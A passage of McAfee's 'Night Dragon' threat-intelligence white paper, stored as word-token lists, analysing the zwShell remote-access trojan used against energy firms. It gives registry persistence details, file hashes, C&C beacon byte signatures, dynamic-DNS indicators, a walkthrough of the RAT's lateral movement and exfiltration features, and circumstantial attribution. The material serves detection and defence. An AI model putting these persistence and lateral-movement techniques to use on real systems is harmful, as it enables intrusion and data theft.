"and", "uses", "the", "first", "available", "key", ",", "indicating", "the", "path", "and", "filename", "of", "the", "backdoor", "in", "a", "ServiceDLL", "register", "."], ["The", "backdoor", "operates", "as", "a", "service", "through", "a", "\u201c", "svchost.exe", "netsvcs", "\u2013", "k", "\u201d", "registry", "setting", "."], ["The", "service", "key", "can", "be", "found", "under", ":", "HKLM\\system\\<controlset>\\services\\"], ["The", "DLL", "is", "a", "system", "or", "hidden", "file", ",", "19", "KB", "to", "23", "KB", "in", "size", "and", "includes", "an", "XOR", "-", "encoded", "data", "section", "that", "is", "defined", "by", "the", "C&C", "application", "when", "the", "dropper", "is", "created", "."], ["It", "includes", "the", "network", "service", "identifier", ",", "registry", "service", "key", ",", "service", "description", ",", "mutex", "name", ",", "C&C", "server", "address", ",", "port", ",", "and", "dropper", "temporary", "file", "name", "."], ["The", "backdoor", "may", "operate", "from", "any", "configured", "TCP", "port", "."], ["This", "DLL", "is", "specified", "in", "the", "ServiceDLL", "key", "in", "the", "related", "Windows", "netsvcs", "registry", "entry", "."], ["The", "DLL", "is", "usually", "found", "in", "the", "%", "System%\\System32", "or", "%", "System%\\SysWow64", "directory", "."], ["Trojan", "backdoor", "2", "*", "startup.dll", "A6CBA73405C77FEDEAF4722AD7D35D60", "Initially", "configured", "with", "the", "following", ":"], ["connect.dll", "6E31CCA77255F9CDE228A2DB9E2A3855", "Connect.dll", "creates", "the", "temporary", "file", "\u201c", "HostID.DAT", ",", "\u201d", "which", "is", "sent", "to", "the", "C&C", "server", ",", "then", "downloads", "and", "configures", "related", "DLLs", "including", ":", "\u2022", "PluginFile.dll"], ["\u2022", "PluginScreen.dll", "\u2022"], ["PluginCmd.dll", "\u2022", "PluginKeyboard.dll", "\u2022", "PluginProcess.dll", "\u2022", "PluginService.dll", "\u2022", "PluginRegedit.dll"], ["Thereafter", "\u201c", "Startup.dll", "\u201d", "operates", "the", "service", "under", "a", "Windows", "Registry", "key", "."], ["All", "communications", "seen", "so", "far", "with", "this", "version", "have", "been", "on", "ports", "25", "and", "80", "over", "TCP", "but", "can", "operate", "on", "any", "determined", "port", "."], ["The", "service", "key", "is", "identified", "in", "the", "DLL", "(", "which", "does", "not", "include", "any", "encrypted", "data", ")", "as", ":", "HKLM\\Software\\RAT"], ["This", "DLL", "is", "usually", "found", "in", "the", "%", "System%\\System32", "directory", ";", "however", ",", "it", "has", "also", "been", "found", "in", "other", "locations", "."], ["The", "path", "to", "the", "backdoor", "DLL", "is", "indicated", "in", "the", "Windows", "Registry", "ServiceDLL", "key", "."], ["*"], ["This", "DLL", "uses", "a", "different", "C&C", "application", "that", "may", "be", "an", "earlier", "version", "of", "zwShell", ",", "analysis", "continues", "."], ["8", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d"], ["The", "Trojan", "components", "are", "manually", "copied", "or", "delivered", "through", "administrative", "utilities", "to", "remote", "systems", "."], ["They", "do", "not", "include", "any", "worm", "or", "self", "-", "replicating", "features", ",", "nor", "can", "the", "Trojan", "\u201c", "infect", "\u201d", "other", "computers", "."], ["Removing", "the", "Trojan", "components", "is", "simply", "a", "matter", "of", "deleting", "the", "related", "files", "and", "registry", "settings", "."], ["The", "Trojan", "backdoor", "communicates", "with", "the", "C&C", "server", "at", "the", "address", "hard", "-", "coded", "in", "each", "DLL", "."], ["The", "C&C", "server", "can", "not", "modify", "the", "backdoor", "once", "it", "is", "installed", ";", "related", "systems", "must", "have", "the", "Trojan", "file", "removed", "before", "a", "new", "backdoor", "DLL", "can", "be", "installed", "on", "the", "system", "."], ["Thus", ",", "if", "the", "C&C", "server", "address", "is", "changed", ",", "those", "servers", "that", "have", "the", "DLL", "with", "previous", "addresses", "must", "be", "remotely", "administered", "by", "the", "attacker", "."], ["Anti", "-", "virus", "Alerts", "Anti", "-", "virus", "patterns", "are", "defined", "according", "to", "samples", "submitted", "by", "clients", "or", "analysts", "as", "they", "are", "discovered", "."], ["Some", "Trojans", "exhibit", "characteristics", "of", "other", "types", "of", "malware", ",", "such", "as", "worms", "or", "viruses", ",", "that", "have", "the", "ability", "to", "infect", "other", "systems", "."], ["RATs", "do", "not", "typically", "include", "such", "features", ",", "and", ",", "because", "they", "are", "defined", "with", "unique", "configurations", "for", "custom", "purposes", ",", "they", "commonly", "change", "faster", "than", "unique", "samples", "can", "be", "identified", "."], ["Only", "when", "an", "entire", "RAT", "toolkit", "is", "found", "can", "we", "define", "an", "anti", "-", "virus", "pattern", "that", "is", "generic", "enough", "to", "detect", "the", "RAT", "regardless", "of", "configuration", "changes", "."], ["The", "package", "necessarily", "includes", "the", "C&C", "application", "server", ",", "the", "generator", "utility", "for", "creating", "droppers", ",", "related", "droppers", ",", "and", "backdoors", "\u2014", "and", "a", "sufficient", "number", "of", "each", "to", "correlate", "the", "toolkit", "."], ["As", "mentioned", "previously", ",", "there", "have", "been", "several", "unique", "patterns", "developed", "from", "samples", "submitted", "to", "McAfee", "(", "as", "well", "as", "to", "other", "anti", "-", "virus", "vendors", ")", "."], ["McAfee", "recommends", "that", "companies", "review", "McAfee", "ePolicy", "Orchestrator", "\u00ae"], ["(", "McAfee", "ePO", "\u2122", ")", "software", "and", "anti", "-", "virus", "logs", "for", "\u201c", "NightDragon", "\u201d", "signature", "detections", "to", "identify", "related", "alerts", "since", "2007", "and", "then", "recover", "and", "resubmit", "these", "samples", "for", "analysis", "to", "investigate", "the", "related", "incidents", "."], ["McAfee", "can", "assist", "with", "the", "analysis", "or", "provide", "instructions", "and", "tools", "for", "internal", "review", "."], ["Network", "Communications", "Network", "communications", "are", "relatively", "easy", "to", "detect", "because", "the", "malware", "uses", "a", "unique", "host", "beacon", "and", "server", "response", "protocol", "."], ["Each", "communication", "packet", "between", "the", "compromised", "host", "and", "the", "C&C", "server", "is", "signed", "with", "a", "plain", "text", "signature", "of", "\u201c", "hW$.", "\u201d", "(", "or", "\u201c", "\\x68\\x57\\x24\\x13", "\u201d", ")", "at", "the", "byte", "offset", "0x42", "within", "the", "TCP", "packet", "."], ["The", "backdoor", "begins", "its", "beacon", "at", "approximately", "five", "-", "second", "intervals", "with", "an", "initial", "packet", "that", "may", "be", "detected", "with", "the", "pattern", ":", "\u201c", "\\x01\\x50[\\x00-\\xff]+\\x68\\x57\\x24\\x13", ".", "\u201d"], ["9", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d"], ["The", "server", "acknowledges", "the", "beacon", "with", "an", "initial", "response", "of", "\u201c", "\\x01\\x60[\\x00-\\xff]+\\x68\\x57\\x24\\x13", ".", "\u201d"], ["The", "backdoor", "sends", "the", "password", "to", "the", "server", "in", "clear", "text", "after", "the", "server", "acknowledges", "the", "connection", "."], ["While", "the", "backdoor", "and", "the", "server", "have", "an", "active", "connection", ",", "the", "backdoor", "will", "send", "\u201c", "keep", "-", "alive", "\u201d", "messages", "that", "can", "be", "detected", "with", ":", "\u201c", "\\x03\\x50[\\x00-\\xff]+\\x68\\x57\\x24\\x13", ".", "\u201d"], ["10", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d"], ["The", "attackers", "use", "\u201c", "dynamic", "DNS", "\u201d", "Internet", "name", "services", "accounts", "to", "relay", "C&C", "communications", "or", "temporarily", "associate", "DNS", "addresses", "with", "remote", "servers", "."], ["Primary", "domains", "that", "have", "been", "used", "for", "C&C", "traffic", "include", "(", "all", "of", "these", "have", "been", "used", "frequently", "by", "other", "malware", "):", "\u2022", "[", "xxxx].is", "-", "a", "-", "chef.com", "\u2022", "[", "xxxx].thruhere.net", "\u2022", "[", "xxxx].office", "-", "on", "-", "the.net", "\u2022", "[", "xxxx].selfip.com", "Note", ":", "The", "above", "hostnames", "(", "is", "-", "a", "-", "chef.com", "<", "http://is", "-", "a", "-", "chef.com", ">", ",", "thruhere.net", "<", "http://thruhere.net", ">", ",", "officeon", "-", "the.net", "<", "http://office", "-", "on", "-", "the.net", ">", ",", "selfip.com", "<", "http://selfip.com", ">", ")", "by", "themselves", "do", "not", "indicate", "malicious", "activity", "and", "there", "are", "plenty", "of", "legitimate", "subdomains", "that", "may", "use", "those", "hostnames", "."], ["Communication", "to", "those", "hostnames", "should", "be", "carefully", "scrutinized", "but", "not", "necessarily", "raise", "alarm", "on", "its", "own"], ["Company", "extranet", "servers", "have", "also", "been", "used", "as", "either", "unique", "or", "secondary", "/", "redundant", "C&C", "servers", "."], ["In", "some", "instances", ",", "the", "attackers", "have", "(", "probably", "mistakenly", ")", "used", "droppers", "configured", "to", "compromise", "one", "company", "\u2019s", "computers", "\u2014", "in", "another", "company", "\u2019s", "computers", "."], ["McAfee", "recommends", "that", "companies", "configure", "intrusion", "detection", "system", "(", "IDS", ")", "rules", "to", "detect", "the", "noted", "signatures", "(", "or", "employ", "the", "user", "-", "defined", "signature"], ["[", "UDS", "]", "\u201c", "BACKDOOR", ":", "NightDragon", "Communication", "Detected", "\u201d", "in", "McAfee", "Network", "Security", "Platform", ")", "and", "monitor", "DNS", "for", "outbound", "communications", "to", "dynamic", "DNS", "addresses", "resolving", "to", "or", "pathed", "back", "as", "suballocated", "to", "servers", "in", "China", ",", "where", "the", "company", "\u2019s", "name", "or", "common", "abbreviation", "forms", "the", "first", "part", "of", "the", "address", "."], ["This", "may", "be", "difficult", "."], ["However", ",", "if", "samples", "of", "the", "backdoor", "DLLs", "are", "found", ",", "DNS", "monitoring", "can", "help", "to", "identify", "other", "compromised", "hosts", "in", "the", "company", "network", "."], ["McAfee", "also", "recommends", "that", "companies", "review", "web", "or", "IDS", "logs", "for", "file", "transfers", "to", "addresses", "registered", "in", "China", "."], ["McAfee", "can", "assist", "with", "the", "analysis", "or", "provide", "instructions", "and", "tools", "for", "internal", "review", "."], ["Additional", "Detection", "Techniques"], ["The", "backdoor", "beacons", "with", "its", "corresponding", "C&C", "server", "as", "long", "as", "the", "related", "address", "is", "active", "."], ["If", "the", "address", "is", "abandoned", "or", "unreachable", ",", "the", "backdoor", "stops", "beaconing", "after", "some", "undetermined", "interval", "."], ["When", "a", "compromised", "computer", "is", "restarted", ",", "however", ",", "the", "beaconing", "begins", "again", "because", "it", "is", "registered", "as", "a", "service", "in", "the", "Windows", "Registry", "."], ["Anti", "-", "virus", "may", "or", "may", "not", "detect", "the", "Trojan", "unless", "it", "is", "beaconing", "or", "a", "full", "file", "system", "scan", "is", "performed", "."], ["McAfee", "Early", "Detection"], ["Customers", "can", "deploy", "a", "number", "of", "McAfee", "products", "to", "help", "protect", "information", "systems", "from", "the", "Night", "Dragon", "attack", ":", "\u2022", "McAfee", "Vulnerability", "Manager", ":", "Using", "agentless", "discovery", "and", "vulnerability", "checking", "to", "assess", "systems", "on", "your", "network", ",", "McAfee", "Vulnerability", "Manager", "is", "an", "enterprise", "-", "class", "vulnerability", "management", "system", "that", "will", "detect", "infected", "Night", "Dragon", "systems", "as", "well", "as", "the", "security", "weaknesses", "in", "systems", "that", "have", "been", "compromised", "."], ["The", "\u201c", "wham", "-", "apt", "-", "nightdragon", "-", "detected", "-", "v7.fasl3", "\u201d", "script", "will", "detect", "this", "threat", "remotely", "on", "systems", "."], ["11", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "\u2022", "McAfee", "Policy", "Auditor", ":", "Using", "agent", "-", "based", "configuration", "audit", "checks", "to", "determine", "the", "most", "secure", "configuration", "of", "a", "system", ",", "McAfee", "Policy", "Auditor", "software", "detects", "the", "security", "weaknesses", "in", "the", "systems", "that", "have", "been", "compromised", "\u2022", "McAfee", "Risk", "Advisory", "(", "MRA", "):", "Properly", "deployed", ",", "McAfee", "Risk", "Advisor", "would", "have", "allowed", "administrators", "to", "see", "the", "misconfigurations", "and", "gap", "in", "security", "coverage", "that", "facilitated", "Night", "Dragon", "\u2019s", "exploitation", "McAfee", "Detection", "Night", "Dragon", "also", "displays", "a", "pattern", "of", "correlated", "activities", "with", "an", "assortment", "of", "other", "software", "tools", "that", "McAfee", "can", "assist", "companies", "to", "identify", "."], ["\u2022", "McAfee", "VirusScan", "Enterprise", ":", "Update", "your", "anti", "-", "virus", ".DATs", "to", "at", "least", "version", "6232", "and", "ensure", "that", "on", "-", "demand", "scans", "are", "working", "properly", "and", "perform", "a", "full", "file", "system", "virus", "scan", "."], ["Review", "McAfee", "ePO", "software", "or", "anti", "-", "virus", "alerts", "and", "network", "logs", "for", "\u201c", "NightDragon", "\u201d", "signature", "detections", "to", "identify", "compromised", "systems", "."], ["Please", "submit", "any", "related", "samples", "to", "virus_research@mcafee.com", "or", "submit", "on", "the", "web", "at", "https://www.webimmune.net/default.asp", "."], ["\u2022", "McAfee", "Network", "Threat", "Response", ":", "McAfee", "Network", "Threat", "Response", "technology", "would", "have", "detected", "the", "malicious", "C&C", "traffic", "and", "would", "have", "alerted", "administrators", "to", "the", "attack", "early", ",", "giving", "them", "time", "to", "react", "and", "prevent", "future", "damage", "Administrators", "can", "also", "download", "the", "following", "free", "tools", "from", "McAfee", ":", "\u2022", "McAfee", "\u201c", "Night", "Dragon", "Vulnerability", "Scanner", "\u201d", "based", "on", "McAfee", "Vulnerability", "Manager", "technology", "to", "scan", "their", "networks", "for", "the", "presence", "of", "malware", "\u2022", "McAfee", "Labs", "Stinger", "McAfee", "Prevention"], ["For", "complete", "prevention", "of", "this", "and", "most", "other", "attacks", "involving", "advanced", "persistent", "threats", "(", "APTs", ")", ",", "customers", "can", "deploy", "application", "whitelisting", "and", "change", "/", "configuration", "control", "software", "on", "their", "critical", "servers", "."], ["These", "technologies", "completely", "prevent", "the", "unauthorized", "running", "of", "DLLs", "/", "EXEs", "as", "well", "as", "the", "modification", "of", "registry", "keys", ",", "services", ",", "and", "more", "involved", "in", "all", "of", "today", "\u2019s", "APT", "and", "zero", "-", "day", "attacks", "."], ["\u2022", "McAfee", "Application", "Control", ":", "McAfee", "Application", "Control", "software", "stops", "Night", "Dragon", "by", "not", "allowing", "the", "dropper", "files", "from", "executing", "(", "even", "as", "administrator", "on", "Windows", ")", ",", "thereby", "preventing", "downloads", "of", "additional", "malware", "and", "the", "setup", "of", "C&C", "channels", "that", "allowing", "RAT", "control", "and", "theft", "of", "sensitive", "files", "\u2022", "McAfee", "Configuration", "Control", ":", "McAfee", "Configuration", "Control", "software", "allows", "you", "to", "disallow", "any", "configuration", "changes", "to", "your", "systems", ",", "protecting", "them", "from", "being", "modified", "without", "explicit", "permission", "(", "even", "with", "administrative", "access", ")", "\u2022", "McAfee", "Database", "Activity", "Monitoring", ":", "delivers", "complete", "database", "protection", "including", "0", "-", "day", "attacks", "and", "web", "born", "attacks", "such", "as", "those", "seen", "with", "SQL", "injection", "in", "Night", "Dragon", "."], ["\u2022", "McAfee", "Network", "Security", "Platform", ":", "blocks", "malicious", "network", "activity", "such", "as", "APT", "command", "and", "control", "traffic", "."], ["\u2022", "McAfee", "Enterprise", "Firewall", ":", "Properly", "installed", "and", "configured", "at", "the", "border", "and", "inside", "your", "organization", ",", "McAfee", "Firewall", "would", "have", "prevented", "the", "Night", "Dragon", "operation", "from", "penetrating", "so", "deeply", "into", "the", "affected", "organizations", "and", "would", "have", "blocked", "C&C", "communication", "from", "the", "RAT", "\u2022", "McAfee", "Web", "Gateway", ":", "Properly", "installed", "and", "configured", ",", "McAfee", "Web", "Gateway", "would", "have", "prevented", "the", "Night", "Dragon", "operation", "from", "using", "their", "RATs", ",", "requiring", "them", "to", "proxy", "-", "enable", "their", "RATs", "or", "use", "alternative", "proxy", "-", "enabled", "RATs", "\u2022", "McAfee", "Endpoint", "Encryption", ":", "Properly", "installed", "and", "configured", ",", "McAfee", "Endpoint", "Encryption", "software", "reduces", "the", "impact", "of", "the", "Night", "Dragon", "attack", "by", "restricting", "access", "to", "the", "core", "targeted", "assets", "12", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "\u2022", "McAfee", "Data", "Loss", "Protection", ":", "Properly", "installed", "and", "configured", ",", "McAfee", "Network", "DLP", "and/or", "McAfee", "Host", "DLP", "solutions", "allow", "you", "to", "prevent", "and", "detect", "the", "extraction", "of", "sensitive", "information", "from", "outside", "the", "company", "\u2022", "McAfee", "Host", "Intrusion", "Prevention", "8.0", ":", "McAfee", "Host", "Intrusion", "Prevention", "8.0", "software", "has", "introduced", "a", "new", "\u201c", "TrustedSource", "\u201d", "APT", "detection", "feature", "that", "allows", "enterprises", "to", "correlate", "endpoint", "executable", "activity", "with", "the", "network", "C&C", "communication", "to", "detect", "and", "prevent", "RAT", "communications", "and", "data", "exfiltration", "activity", "\u2022", "McAfee", "VirusScan", "\u00ae", "Enterprise", ":"], ["In", "addition", "to", "detecting", "associated", "malware", "and", "RATs", "on", "the", "endpoint", ",", "customers", "can", "also", "leverage", "access", "protection", "features", "in", "McAfee", "VirusScan", "Enterprise", "to", "prevent", "(", "and", "alert", "on", ")", "the", "creation", "of", "Night", "Dragon", "-", "related", "files", "and", "folder", "structures", "."], ["Other", "built", "-", "in", "features", "such", "infection", "tracing", "and", "McAfee", "Global", "Threat", "Intelligence", "\u2122", "can", "assist", "with", "the", "identification", "and", "quarantining", "or", "removal", "of", "new", "and", "unknown", "associated", "malware", "and", "RATs", "."], ["If", "you", "have", "discovered", "the", "presence", "of", "Night", "Dragon", "in", "your", "environment", "and", "would", "like", "incident", "-", "response", "or", "forensics", "assistance", "to", "respond", "and", "repair", ",", "please", "contact", "Foundstone", "Professional", "Services", "on", "incidentresponse@foundstone.com", "or", "submit", "any", "related", "samples", "to", "Virus_Research@avertlabs.com", "or", "on", "the", "web", "at", "McAfee", "Labs", "WebImmune", "."], ["Conclusion", "Well", "-", "coordinated", ",", "targeted", "attacks", "such", "as", "Night", "Dragon", ",", "orchestrated", "by", "a", "growing", "group", "of", "malicious", "attackers", "committed", "to", "their", "targets", ",", "are", "rapidly", "on", "the", "rise", "."], ["These", "targets", "have", "now", "moved", "beyond", "the", "defense", "industrial", "base", ",", "government", ",", "and", "military", "computers", "to", "include", "global", "corporate", "and", "commercial", "targets", "."], ["While", "Night", "Dragon", "attacks", "focused", "specifically", "on", "the", "energy", "sector", ",", "the", "tools", "and", "techniques", "of", "this", "kind", "can", "be", "highly", "successful", "when", "targeting", "any", "industry", "."], ["Our", "experience", "has", "shown", "that", "many", "other", "industries", "are", "currently", "vulnerable", "and", "are", "under", "continuous", "and", "persistent", "cyberespionage", "attacks", "of", "this", "type", "."], ["More", "and", "more", ",", "these", "attacks", "focus", "not", "on", "using", "and", "abusing", "machines", "within", "the", "organizations", "being", "compromised", ",", "but", "rather", "on", "the", "theft", "of", "specific", "data", "and", "intellectual", "property", "."], ["It", "is", "vital", "that", "organizations", "work", "proactively", "toward", "protecting", "the", "heart", "of", "their", "value", ":", "intellectual", "property", "."], ["Enterprises", "need", "to", "take", "action", "to", "discover", "these", "assets", "in", "their", "environments", ",", "assess", "their", "configurations", "for", "vulnerabilities", ",", "and", "protect", "them", "from", "misuse", "and", "attack", "."], ["For", "additional", "research", "and", "information", ",", "review", "Hacking", "Exposed", ":", "Network", "Secret", "and", "Solutions", "\u2014", "6th"], ["Edition", "(", "Osborne", "McGraw", "-", "Hill", ")", "."], ["You", "can", "also", "visit", "http://www.hackingexposed.com", "for", "information", "on", "advanced", "hacker", "techniques", "and", "to", "sign", "up", "for", "\u201c", "Hacking", "Exposed", "\u201d", "monthly", "webinars", "."], ["Credits", "and", "Acknowledgements"], ["The", "preceding", "white", "paper", "was", "a", "collaborative", "effort", "among", "numerous", "people", "and", "entities", "including", "McAfee", "Foundstone", "Professional", "Services", "consultants", ",", "McAfee", "Labs", ",", "McAfee", "employees", ",", "executives", ",", "and", "researchers", ",", "HBGary", "and", "National", "Cyber", "-", "Forensics", "&", "Training", "Alliance", "(", "NCFTA", ")", "."], ["Significant", "contributors", "include", "Shane", "Shook", ",", "Dmitri", "Alperovitch", ",", "Stuart", "McClure", ",", "Georg", "Wicherski", ",", "Greg", "Hoglund", ",", "Shawn", "Bracken", ",", "Ryan", "Permeh", ",", "Vitaly", "Zaytsev", ",", "Mark", "Gilbert", ",", "Mike", "Spohn", ",", "George", "Kurtz", ",", "and", "Adam", "Meyers", "."], ["13", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Appendix", "A", ":"], ["zwShell", "\u2014", "the", "RAT", "Below", "is", "a", "walk", "-", "through", "of", "the", "capabilities", "of", "zwShell", "and", "a", "demonstration", "of", "how", "the", "attackers", "used", "zwShell", "as", "a", "command", "and", "control", "server", "to", "exfiltrate", "data", "from", "within", "the", "targeted", "companies", "."], ["1", "."], ["When", "zwShell", "is", "launched", ",", "it", "presents", "a", "fake", "crash", "error", "to", "the", "user", "and", "contains", "a", "hidden", "text", "entry", "field", "below", "the", "\u201c", "Write", "of", "address", "00000000", "."], ["Process", "stopped", "\u201d", "line", "."], ["By", "entering", "the", "password", "in", "the", "hidden", "dialog", "box", "above", "the", "\u201c", "ok", "\u201d", "button", "to", "launch", "the", "application", "requires", "typing", "a", "special", "password", ",", "\u201c", "zw.china", ".", "\u201d"], ["Without", "that", "password", ",", "the", "tool", "will", "not", "start", "."], ["This", "obfuscation", "method", "is", "likely", "used", "to", "confuse", "investigators", "about", "the", "true", "purpose", "of", "this", "executable", "."], ["2", "."], ["Once", "the", "error", "is", "bypassed", ",", "and", "zwShell", "is", "launched", ",", "it", "allows", "the", "attacker", "to", "create", "a", "custom", "Trojan", "by", "selecting", "the", "Server", "menu", "or", "to", "launch", "the", "C&C", "server", "by", "clicking", "Start", "and", "entering", "the", "port", "to", "listen", "for", "traffic", "with", "the", "password", "used", "by", "the", "backdoor", "DLLs", "."], ["Once", "started", ",", "the", "application", "will", "begin", "listening", "for", "incoming", "compromised", "client", "connections", "and", "display", "them", "inside", "the", "grid", "."], ["The", "attacker", "can", "launch", "as", "many", "instances", "of", "the", "zwShell", "application", "as", "required", "\u2014", "as", "long", "as", "each", "listens", "to", "a", "different", "port", "or", "password", "."], ["In", "this", "manner", ",", "multiple", "\u201c", "networks", "\u201d", "of", "compromised", "computers", "can", "be", "monitored", "."], ["3", "."], ["The", "attacker", "can", "also", "click", "on", "the", "Options", "menu", "to", "configure", "the", "C&C", "server", "settings", "."], ["Those", "settings", "include", "selection", "of", "the", "listening", "port", ",", "the", "password", "that", "will", "encrypt", "the", "C&C", "traffic", "(", "which", "must", "match", "the", "password", "selected", "at", "the", "time", "of", "the", "Trojan", "generation", ")", ",", "the", "ability", "to", "specify", "custom", "sound", "notifications", "for", "when", "infected", "machines", "connect", "and", "disconnect", "from", "the", "C&C", "server", ",", "and", "the", "ability", "to", "increase", "the", "color", "depth", "used", "for", "remote", "access", "to", "the", "machine", ",", "as", "well", "as", "an", "optional", "capability", "to", "allow", "resumes", "of", "interrupted", "file", "transfers", "from", "the", "client", "machine", "."], ["The", "attacker", "can", "stop", "the", "listener", "and", "start", "with", "new", "options", "to", "monitor", "or", "connect", "with", "other", "compromised", "computers", "."], ["14", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "4", "."], ["The", "attacker", "can", "specify", "the", "password", "(", "which", "must", "match", "the", "password", "set", "up", "for", "the", "server", "in", "Step", "3", ")", ",", "the", "name", "and", "path", "to", "the", "RAT", "DLL", "that", "will", "be", "injected", "into", "the", "svchost.exe", "Windows", "services", "process", ",", "the", "service", "and", "mutex", "names", ",", "and", "service", "displayed", "name", "and", "description", "."], ["The", "attacker", "can", "also", "specify", "up", "to", "two", "C&C", "hostnames", "or", "IP", "address", ",", "port", "address", ",", "and", "dropper", "EXE", "process", "icon", "."], ["Once", "the", "Create", "button", "is", "clicked", ",", "zwShell", "will", "generate", "a", "custom", "EXE", "dropper", "process", "which", ",", "when", "executed", ",", "will", "delete", "itself", "and", "extract", "a", "RAT", "DLL", "that", "will", "be", "launched", "as", "a", "persistent", "Windows", "service", "."], ["The"], ["RAT", "will", "then", "immediately", "send", "a", "beacon", "on", "the", "configured", "port", "to", "the", "designated", "C&C", "server", "and", "wait", "for", "instructions", "."], ["5", "."], ["The", "dropper", "will", "be", "copied", "over", "network", "shares", "to", "the", "compromised", "computer", "and", "remotely", "execute", "with", "psexec", "or", "via", "Windows", "Terminal", "Services", "(", "RDP", ")", "."], ["In", "some", "cases", ",", "an", "\u201c", "AT.job", "\u201d", "or", "\u201c", "SchTasks", "\u201d", "entry", "will", "be", "used", "to", "execute", "the", "dropper", "over", "the", "network", "on", "the", "compromised", "computer", "."], ["When", "executed", ",", "the", "dropper", "will", "create", "a", "temporary", "file", "and", "extract", "a", "RAT", "DLL", "that", "will", "be", "launched", "as", "a", "persistent", "Windows", "service", "."], ["The", "RAT", "will", "then", "immediately", "send", "a", "beacon", "on", "the", "configured", "port", "to", "the", "designated", "C&C", "server", "and", "wait", "for", "instructions", "."], ["The", "dropper", "will", "automatically", "delete", "itself", "after", "the", "backdoor", "service", "is", "created", ",", "and", "the", "temporary", "file", "will", "be", "deleted", "when", "the", "system", "is", "rebooted", "."], ["An", "entry", "will", "be", "created", "in", "the", "Windows", "Update", "logs", "(", "KB****.log", ")", "in", "the", "C:\\Windows", "directory", "with", "the", "date", "and", "time", "and", "path+name", "of", "the", "temporary", "file", "."], ["15", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "6", "."], ["When", "a", "client", "is", "executed", ",", "it", "connects", "to", "the", "attacker", "\u2019s", "zwShell", "interface", ",", "along", "with", "its", "IP", "address", ",", "PC", "name", ",", "name", "of", "the", "logged", "-", "in", "user", ",", "and", "information", "about", "the", "operating", "system", "(", "OS", ")", "version", "of", "the", "machine", ",", "including", "the", "major", "patch", "levels", "."], ["7", "."], ["The", "attacker", "in", "charge", "of", "the", "C&C", "server", "can", "establish", "full", "remote", "control", "of", "the", "connected", "machine", "and", "can", "browse", "the", "file", "system", ",", "launch", "command", "-", "line", "shells", ",", "manipulate", "the", "registry", ",", "view", "the", "remote", "desktop", ",", "and", "uninstall", "the", "Trojan", "from", "the", "client", "."], ["8", "."], ["Browsing", "the", "client", "file", "system", "is", "a", "fully", "interactive", "process", "and", "has", "a", "familiar", "user", "interface", "similar", "to", "Windows", "Explorer", "."], ["Individual", "files", "and", "folders", "can", "be", "deleted", ",", "renamed", ",", "copied", ",", "downloaded", ",", "and", "uploaded", "to", "the", "remote", "machine", "."], ["16", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "9", "."], ["A", "remote", "command", "-", "line", "shell", "can", "be", "launched", "to", "execute", "commands", "directly", "on", "the", "remote", "machine", "."], ["When", "the", "attacker", "uses", "this", "function", ",", "a", "copy", "of", "CMD.EXE", "is", "copied", "to", "the", "compromised", "system", "in", "a", "Windows", "%", "Temp%", "directory", "with", "the", "filename", "svchost.exe", "."], ["This", "copy", "is", "an", "unmodified", "version", "of", "the", "Microsoft", "Windows", "command", "shell", "executable", "."], ["10", "."], ["The", "Registry", "can", "also", "be", "viewed", "and", "edited", "in", "a", "user", "interface", "similar", "to", "the", "Windows", "Registry", "editor", "."], ["17", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Appendix", "B", ":", "Attribution"], ["IMPORTANT", ":", "McAfee", "has", "no", "direct", "evidence", "to", "name", "the", "originators", "of", "these", "attacks", "but", "rather", "has", "provided", "circumstantial", "evidence", "."], ["While", "we", "believe", "many", "actors", "have", "participated", "in", "these", "attacks", ",", "we", "have", "been", "able", "to", "identify", "one", "individual", "who", "has", "provided", "the", "crucial", "C&C", "infrastructure", "to", "the", "attackers", "\u2014", "this", "individual", "is", "based", "in", "Heze", "City", ",", "Shandong", "Province", ",", "China", "."], ["Although", "we", "do", "n\u2019t", "believe", "this", "individual", "is", "the", "mastermind", "behind", "these", "attacks", ",", "it", "is", "likely", "this", "person", "is", "aware", "or", "has", "information", "that", "can", "help", "identify", "at", "least", "some", "of", "the", "individuals", ",", "groups", ",", "or", "organizations", "responsible", "for", "these", "intrusions", "."], ["Figure", "6", "."], ["Shandong", "Province", ",", "China", "The", "individual", "runs", "a", "company", "that", ",", "according", "to", "the", "company", "\u2019s", "advertisements", ",", "provides", "\u201d", "Hosted", "Servers", "in", "the", "U.S.", "with", "no", "records", "kept", "\u201d", "for", "as", "little", "as", "68", "RMB", "(", "US$", "10", ")", "per", "year", "for", "100", "MB", "of", "space", "."], ["The", "company", "\u2019s", "U.S.-based", "leased", "servers", "have", "been", "used", "to", "host", "the", "zwShell", "C&C", "application", "that", "controlled", "machines", "across", "the", "victim", "companies", "."], ["Beyond", "the", "connection", "to", "the", "hosting", "services", "reseller", "operation", ",", "there", "is", "other", "evidence", "indicating", "that", "the", "attackers", "were", "of", "Chinese", "origin", "."], ["Beyond", "the", "curious", "use", "of", "the", "\u201c", "zw.china", "\u201d", "password", "that"], ["unlocks", "the", "operation", "of", "the", "zwShell", "C&C", "Trojan", ",", "McAfee", "has", "determined", "that", "all", "of", "the", "identified", "data", "exfiltration", "activity", "occurred", "from", "Beijing", "-", "based", "IP", "addresses", "and", "operated", "inside", "the", "victim", "companies", "weekdays", "from", "9:00", "a.m.", "to", "5:00", "p.m.", "Beijing", "time", ",", "which", "also", "suggests", "that", "the", "involved", "individuals", "were", "\u201c", "company", "men", "\u201d", "working", "on", "a", "regular", "job", ",", "rather", "than", "freelance", "or", "unprofessional", "hackers", "."], ["In", "addition", ",", "the", "attackers", "employed", "hacking", "tools", "of", "Chinese", "origin", "and", "that", "are", "prevalent", "on", "Chinese", "underground", "hacking", "forums", "."], ["These", "included", "Hookmsgina", "and", 